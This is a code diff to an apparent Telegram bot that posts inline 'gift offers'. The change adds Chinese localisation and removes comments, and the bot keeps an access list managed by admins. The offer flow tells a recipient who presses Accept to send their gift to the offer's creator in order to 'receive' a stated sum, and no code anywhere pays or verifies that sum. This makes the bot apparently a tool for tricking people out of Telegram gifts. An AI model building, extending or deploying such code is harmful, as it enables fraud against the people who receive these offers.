@@ -123,23 +123,19 @@ export default {
             return new Response("OK", { status: 200 });
         }
 
-        // --- ИСПРАВЛЕННАЯ КОМАНДА /remove all ---
         if (command === "/remove" && targetUser.toLowerCase() === "all") {
             try {
                 let cursor = undefined;
                 let keysToDelete = [];
                 
-                // Делаем 3 прохода по базе, чтобы выловить все ключи (защита от лагов KV)
                 for (let i = 0; i < 3; i++) {
                     cursor = undefined;
                     do {
                         const list = await kv.list({ cursor });
                         for (const key of list.keys) {
-                            // Удаляем только доступы (allowed_)
                             if (key.name.startsWith("allowed_")) {
-                                // НЕ удаляем главных админов!
                                 if (key.name === `allowed_id:${ADMIN_ID_1}` || key.name === `allowed_id:${ADMIN_ID_2}`) continue;
-                                if (key.name === `allowed_username:gwrex`) continue; // Защита твоего ника
+                                if (key.name === `allowed_username:gwrex`) continue;
 
                                 keysToDelete.push(key.name);
                             }
@@ -148,7 +144,6 @@ export default {
                     } while (cursor);
                 }
 
-                // Убираем дубликаты
                 keysToDelete = [...new Set(keysToDelete)];
 
                 for (const key of keysToDelete) {
@@ -238,8 +233,15 @@ export default {
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
+        // ОПРЕДЕЛЕНИЕ ЯЗЫКА (RU, EN, CN)
         let lang = "ru";
-        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); }
+        if (textQuery.includes("eng") || textQuery.includes("en ")) { 
+            lang = "en"; 
+            textQuery = textQuery.replace(/eng/g, '').trim(); 
+        } else if (textQuery.includes("cn") || textQuery.includes("中文")) { 
+            lang = "cn"; 
+            textQuery = textQuery.replace(/cn/g, '').trim(); 
+        }
 
         const allNums = textQuery.match(/\d+/g); 
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
@@ -261,16 +263,35 @@ export default {
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
-        let text = (lang === "en") 
-            ? `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`
-            : `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+        // ТЕКСТЫ ДЛЯ ОФФЕРА
+        let text = "";
+        let btnAccept = "✅ Принять";
+        let btnDecline = "❌ Отклонить";
+        let titleText = "";
+
+        if (lang === "en") {
+            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
+            btnAccept = "✅ Accept";
+            btnDecline = "❌ Decline";
+            titleText = `Offer from ${senderName}`;
+        } else if (lang === "cn") {
+            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b> 为您提供 ${amount} ${currencyDisplay} 购买此礼物。\n\n${giftLink}\n\n⏳ 报价有效期为 5 小时 59 分钟。`;
+            btnAccept = "✅ 接受";
+            btnDecline = "❌ 拒绝";
+            titleText = `来自 ${senderName} 的报价`;
+        } else {
+            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
+            btnAccept = "✅ Принять";
+            btnDecline = "❌ Отклонить";
+            titleText = `Оффер от ${senderName}`;
+        }
 
         const results = [{
           type: "article", id: "1",
-          title: lang === "en" ? `Offer from ${senderName}` : `Оффер от ${senderName}`,
-          description: lang === "en" ? `For ${amount} ${currencyDisplay}` : `За ${amount} ${currencyDisplay}`,
+          title: titleText,
+          description: `За ${amount} ${currencyDisplay}`, // Оставляем в описании для краткости
           input_message_content: { message_text: text, parse_mode: "HTML" },
-          reply_markup: { inline_keyboard: [[{ text: lang === "en" ? "✅ Accept" : "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: lang === "en" ? "❌ Decline" : "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
+          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
         }];
 
         await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
@@ -317,20 +338,32 @@ export default {
 
           let newText = "";
           let newMarkup = { inline_keyboard: [] };
+          let alertText = "";
 
           if (action === "acc") {
-            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: lang === "en" ? `Offer accepted ✅\n\nClick "Gift" to open it` : `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, show_alert: true }, BOT_TOKEN);
+            if (lang === "en") alertText = `Offer accepted ✅\n\nClick "Gift" to open it`;
+            else if (lang === "cn") alertText = `报价已接受 ✅\n\n点击“礼物”打开它`;
+            else alertText = `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`;
+
+            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true }, BOT_TOKEN);
+            
             const finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);
+
             if (lang === "en") {
                 newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${sellerUsername}).`;
                 newMarkup = { inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] };
+            } else if (lang === "cn") {
+                newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n要获得 ${amount} ${displayCurrency}，请将礼物发送给卖家 (@${sellerUsername})。`;
+                newMarkup = { inline_keyboard: [[{ text: "🎁 发送礼物", url: finalUrl }]] };
             } else {
                 newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
                 newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] };
             }
           } else {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
-            newText = lang === "en" ? `❌ <b>You declined the offer.</b>` : `❌ <b>Вы отказались от оффера.</b>`;
+            if (lang === "en") newText = `❌ <b>You declined the offer.</b>`;
+            else if (lang === "cn") newText = `❌ <b>您拒绝了报价。</b>`;
+            else newText = `❌ <b>Вы отказались от оффера.</b>`;
           }
 
           if (cq.inline_message_id) {
